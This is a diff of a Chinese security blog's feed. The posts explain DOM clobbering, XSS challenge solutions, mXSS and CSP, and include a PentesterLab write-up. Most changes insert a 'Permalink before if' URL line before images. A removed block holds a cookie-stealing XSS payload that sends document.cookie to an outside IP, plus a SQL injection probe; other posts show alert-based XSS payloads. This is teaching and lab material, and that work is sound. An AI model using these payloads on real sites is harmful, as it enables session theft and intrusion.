@@ -118,23 +118,23 @@ position: relative;
 &lt;h2 id="simple-example">Simple Example
 &lt;/h2>&lt;p>其实 Dom Clobbering 比较简单，我们看几个简单的例子就能知道它是干什么了的。&lt;/p>
 &lt;h3 id="exmaple-1---create">Exmaple 1 - Create
-&lt;/h3>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png"
+&lt;/h3>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们可以看到通过 id 或者 name 属性，我们可以在&lt;code>document&lt;/code>或者&lt;code>window&lt;/code>对象下创建一个对象。&lt;/p>
 &lt;h3 id="example-2---overwrite">Example 2 - Overwrite
-&lt;/h3>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png"
+&lt;/h3>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到&lt;code>document.cookie&lt;/code>已经被我们用 img 标签给覆盖了&lt;/p>
 &lt;h3 id="example-3---overwrite2">Example 3 - Overwrite2
-&lt;/h3>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png"
+&lt;/h3>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我们通过多层覆盖掉了&lt;code>document.body.appendChild&lt;/code>方法。&lt;/p>
 &lt;h2 id="attack-method">Attack Method
 &lt;/h2>&lt;p>既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个&lt;code>HTMLElment&lt;/code>对象。&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。&lt;/p>
@@ -155,7 +155,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们可以得到两种标签对象：&lt;code>HTMLAreaElement (&amp;lt;area&amp;gt;)&lt;/code>&amp;amp; &lt;code>HTMLAnchorElement (&amp;lt;a&amp;gt;)&lt;/code>，这两个标签对象我们都可以利用&lt;code>href&lt;/code>属性来进行字符串转换。&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="htmlcollection">HTMLCollection
@@ -226,7 +226,7 @@ getter Element? namedItem(DOMString name);
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png"
+&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="html-relationships">HTML Relationships
@@ -536,7 +536,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们再随便评论一下就好了，就可以触发我们构造的 XSS 了。&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="labclobbering-dom-attributes-to-bypass-html-filters">Lab:Clobbering DOM attributes to bypass HTML filters
@@ -878,7 +878,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>把它当作评论提交&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用&lt;code>iframe&lt;/code>进行&lt;code>setTimeout&lt;/code>&lt;/p>
@@ -891,7 +891,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里要注意一定要得等评论加载完毕再用&lt;code>#x&lt;/code>选择&lt;code>form&lt;/code>，所以这里的 500ms 需要根据自己的网络情况适当调整。&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="cve-2017-0928-bypassing-sanitization-using-dom-clobbering">CVE-2017-0928 Bypassing sanitization using DOM clobbering
@@ -939,15 +939,15 @@ loading="lazy"
 &lt;/div>&lt;p>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。&lt;/p>
 &lt;h3 id="xss-in-gmails-amp4email-via-dom-clobbering">XSS in GMail’s AMP4Email via DOM Clobbering
 &lt;/h3>&lt;p>终于到了我们开头提到的 OWASP Top 10 提名的攻击实例了，作者首先通过直接在控制台输入 window 进行 fuzz&lt;/p>
-&lt;p>&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png"
+&lt;p>Permalink before if: https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里他首先利用了&lt;code>AMP&lt;/code>，尝试插入&lt;code>&amp;lt;a id=AMP&amp;gt;&lt;/code>，但是这个&lt;code>AMP&lt;/code>被 ban 了&lt;/p>
-&lt;p>&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png"
+&lt;p>Permalink before if: https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>接着找到下一个&lt;code>AMP_MODE&lt;/code>，这个没有被 ban ，反而让作者发现了这里加载失败的 URL 当中有一个&lt;code>undefined&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png"
+&lt;p>Permalink before if: https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这就是作者插入了&lt;code>&amp;lt;a id=AMP_MODE&amp;gt;&lt;/code>导致产生的&lt;code>undefined&lt;/code>，主要产生这个问题的代码经作者简化后是这样的：&lt;/p>
@@ -1802,7 +1802,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">--&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">svg&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">onload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">alert&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png"
+&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是这里我们并不能直接传入 HTML 编码绕过，得需要加一个 img 标签利用其属性进行绕过，为什么呢？&lt;/p>
@@ -1861,11 +1861,11 @@ loading="lazy"
 >data state&lt;/a>，也就是结束了注释解析状态回到了最开始的 HTML 解析状态，这样就导致我们就成功逃逸了注释符。&lt;/p>
 &lt;h3 id="difficult-version">Difficult Version
 &lt;/h3>&lt;p>再过滤了实体编码&lt;code>&amp;amp;#;&lt;/code>之后我们要怎么绕过呢？我们先给出一个 Trick ，在这里我们可以使用&lt;code>&amp;lt;?&lt;/code>进行绕过。&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我们在使用了&lt;code>&amp;lt;?&lt;/code>之后成功把 p 标签逃逸了出来，可是为什么呢？我们可以输出第一步的&lt;code>template.innerHTML&lt;/code>看看&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以发现在第一步渲染的时候，传入的&lt;code>&amp;lt;?&lt;/code>已经变成了&lt;code>&amp;lt;!--?--&amp;gt;&lt;/code>，存在&lt;code>--&amp;gt;&lt;/code>可以将注释闭合。可是这是为什么呢？&lt;/p>
@@ -2161,7 +2161,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>利用题目中原有的&lt;code>$(&amp;quot;#keanu&amp;quot;).popover(&amp;quot;show&amp;quot;);&lt;/code>来触发我们的 popover ，我们暂且先注释掉题目当中的延迟关闭的功能以便于我们观察。&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>尽管 eval 执行出错，但是我们可以发现 number 标签当中确实被我们注入了一些其他的内容&lt;/p>
@@ -2193,7 +2193,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">number=&amp;#39;&amp;amp;name=&amp;lt;button id%3D&amp;#34;keanu&amp;#34; data-toggle%3D&amp;#34;popover&amp;#34; data-container%3D&amp;#34;%23number&amp;#34; data-content%3D&amp;#34;&amp;#39;%3Balert(1)%3B%2F%2F&amp;#34;&amp;gt;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png"
+&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="ww3">WW3
@@ -2302,7 +2302,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个题目让我深深地体会到了 JavaScript 的恶意&amp;hellip;先放个图，大家自行先体会一下，然后我们开始分析一下题目。&lt;/p>
-&lt;p>&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
+&lt;p>Permalink before if: https://i.redd.it/rz3o1yibnc511.png&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目用比较多的代码做了一个获取图片以及输出自定义 text 的功能，仍旧是上题的四个外部 JS 文件，以及一大段 JS 代码。本题涉及到 JavaScript 比较多的黑魔法，我们一个个来看看。&lt;/p>
@@ -2384,7 +2384,7 @@ loading="lazy"
 &lt;/div>&lt;p>用来进行 DOM 元素操作等，看起来我们的目标就是&lt;code>setTimeout&lt;/code>函数中通过&lt;code>$(&amp;quot;#notify&amp;quot;).html(html)&lt;/code>来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。&lt;/p>
 &lt;h3 id="dom-clobbering">DOM Clobbering
 &lt;/h3>&lt;p>首先我们先来看看几个比较有趣的例子：&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>根据 MDN 文档&lt;/p>
@@ -2394,11 +2394,11 @@ loading="lazy"
 >same origin policy&lt;/a>.&lt;/p>
 &lt;/blockquote>
 &lt;p>这里的&lt;code>document.domain&lt;/code>并没有获取到我的域名&lt;code>zedd.vv&lt;/code>，反而是获取到了 img 标签，然后我们可以直接输出 document 对象来看看是怎么回事&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>通过这个例子我们可以知道，可以通过一些标签的 id(name) 属性来控制 document(window) 通过 DOM API(BOM API) 获取到的某个东西&lt;/p>
-&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png"
+&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我查阅过相关资料，也询问过一些前端的专业人员，这里给我的解释是&amp;quot;document 和 window 两个变量，其实是 DOM 和 BOM 的规范，一般来说这两个不应该被当做普通的 JS 对象，但是规范与实现不同&amp;quot;，&amp;ldquo;都是因为上古遗留问题，现在哪有直接写 document.xxx 来获取元素的，TS 和 eslint 都会报错&amp;rdquo;。&lt;/p>
@@ -2573,7 +2573,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png"
+&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>原理都是一样的，这里&lt;code>test&lt;/code>函数在&lt;code>onerror&lt;/code>作用域找到了 x 变量，所以就不会再去找 window 作用域下的 &lt;code>x=false&lt;/code>变量了，所以本题我们需要引入一个&lt;code>name=notify&lt;/code>的标签来“覆盖”掉原来的 notify 变量。&lt;/p>
@@ -2615,7 +2615,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png"
+&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="jquerys-mxss">JQuery&amp;rsquo;s &amp;lsquo;mXSS&amp;rsquo;
@@ -2750,7 +2750,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到&lt;/p>
 &lt;p>最后再来一遍：&lt;/p>
-&lt;p>&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
+&lt;p>Permalink before if: https://i.redd.it/rz3o1yibnc511.png&lt;img src="https://i.redd.it/rz3o1yibnc511.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="references">References
@@ -3314,15 +3314,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>CSP 目前有两版, [CSP1][] 和 [CSP2][]. 两版的支持状态可以在 &lt;a class="link" href="http://caniuse.com/#search=csp" target="_blank" rel="noopener"
->http://caniuse.com/#search=csp&lt;/a> 中查到. 如下:&lt;/p>
-&lt;p>CSP 1.0:&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007189.jpg"
-loading="lazy"
->&lt;/p>
-&lt;p>CSP 2.0:&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001204.jpg"
-loading="lazy"
->&lt;/p>
+>http://caniuse.com/#search=csp&lt;/a> 中查到.&lt;/p>
 &lt;h4 id="x-frame-options">X-Frame-Options
 &lt;/h4>&lt;blockquote>
 &lt;p>​ X-Frame-Options 有三个值:&lt;/p>
@@ -3621,7 +3613,7 @@ loading="lazy"
 &lt;h4 id="http-header">HTTP Header
 &lt;/h4>&lt;p>通过 Meta 的方式很是简单，但当涉及到的页面较多时，使用 Meta 标签的方式需要在每个页面都各自加上。而如果通过服务端配置 HTML 返回的响应头 HTTP header 带上 CSP 的指令的话，那将能够一劳永逸，同时支持多个页面。下图为响应头&lt;/p>
 &lt;p>&lt;a class="link" href="https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png" target="_blank" rel="noopener"
->&lt;img src="https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png"
+>Permalink before if: https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png&lt;img src="https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png"
 loading="lazy"
 alt="http"
 >&lt;/a>&lt;/p>
@@ -3908,7 +3900,7 @@ alt="http"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当前目录下随便放置一个文件提供引入即可，然后我们可以发现&lt;code>iframe&lt;/code>当中其实就是个 html 页面&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009928.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009928.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009928.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后我们尝试对其进行修改&lt;/p>
@@ -3920,13 +3912,10 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">frames&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">head&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;hasaki!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003468.jpg"
+&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003468.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003468.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们就可以在&lt;code>iframe&lt;/code>的页面中发现&lt;code>&amp;lt;head&amp;gt;&lt;/code>标签内容已经被我们改成了&lt;code>hasaki!&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000023.jpg"
-loading="lazy"
->&lt;/p>
 &lt;p>做到这里，我们基本可以想到，如果我们引用的是一个没有 CSP 策略的地址含有恶意的 js 代码会怎么样呢？我们可以试一下&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
@@ -3990,7 +3979,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以发现执行了 javascript 代码&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004313.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004313.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004313.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2">Example 2
@@ -4374,9 +4363,6 @@ Jsonp 正是利用这种特性来实现跨域的：在页面中引入要跨域�
 &lt;h3 id="mxss-attacks">MXSS Attacks
 &lt;/h3>&lt;h4 id="介绍-3">介绍
 &lt;/h4>&lt;p>不论是服务器端或客户端的XSS过滤器，都认定过滤后的HTML源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入。然而，如果用户所提供的富文本内容通过 javascript 代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进后发生意外变化（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation），而最终导致XSS的攻击流程，被称为突变XSS（mXSS, Mutation-based Cross-Site-Scripting）。&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000864.jpg"
-loading="lazy"
->&lt;/p>
 &lt;h4 id="常见注入点-2">常见注入点
 &lt;/h4>&lt;h5 id="反引号打破属性边界导致的-mxss">反引号打破属性边界导致的 mXSS
 &lt;/h5>&lt;p>Input:&lt;/p>
@@ -4924,125 +4910,11 @@ be decoded either&lt;/p>
 &lt;p>&lt;a class="link" href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener"
 >XSS小结&lt;/a>&lt;/p>
 &lt;p>&lt;a class="link" href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29" target="_blank" rel="noopener"
->Cross-site Scripting (XSS)&lt;/a>&lt;/p></description></item><item><title>XSS and MYSQL FILE</title><link>https://zeddyu.github.io/p/xss-and-mysql-file/</link><pubDate>Mon, 11 Mar 2019 17:56:16 +0000</pubDate><guid>https://zeddyu.github.io/p/xss-and-mysql-file/</guid><description>&lt;p>Write up of Pentesterlab&amp;rsquo;s &lt;a class="link" href="https://pentesterlab.com/exercises/xss_and_mysql_file/" target="_blank" rel="noopener"
->XSS and MySQL FILE&lt;/a>&lt;/p>
-&lt;p>[TOC]&lt;/p>
-&lt;h2 id="pre">Pre
-&lt;/h2>&lt;p>与之前一样，导入 iso 后查看 ip 即可&lt;/p>
-&lt;h2 id="hacking">Hacking
-&lt;/h2>&lt;h3 id="injection-and-xss">Injection and XSS
-&lt;/h3>&lt;p>一开始做了很多工作在 fuzz 注入上，发现主页的&lt;code>post.php?id=2&lt;/code>与登录处都不能注入，然后用 xsspt.com 的 xss 平台竟然收不到 cookie … 坑的一批&lt;/p>
-&lt;h3 id="xss">XSS
-&lt;/h3>&lt;p>由于 xss 平台不知道怎么收不到 cookie ，只能用自己的服务器了，用了文档的 payload&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;img src=&amp;#34;http://106.14.153.173:2015/?&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cookie&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39; &amp;#34;/&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">);&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>这里强烈建议使用 FireFox + Cookie Manager 来完成，因为感觉这个 session 控制写的不是很好，不带 cookie 访问的话，它会强制重置你的 cookie ，然后就会变成每次都需要 burp 抓包来修改 cookie ，十分麻烦&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009559.jpg"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="sql-injection">SQL Injection
-&lt;/h3>&lt;p>进入到管理员界面后，发现在&lt;code>edit.php&lt;/code>处存在注入点&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">172.16&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">71.149&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">admin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">edit&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
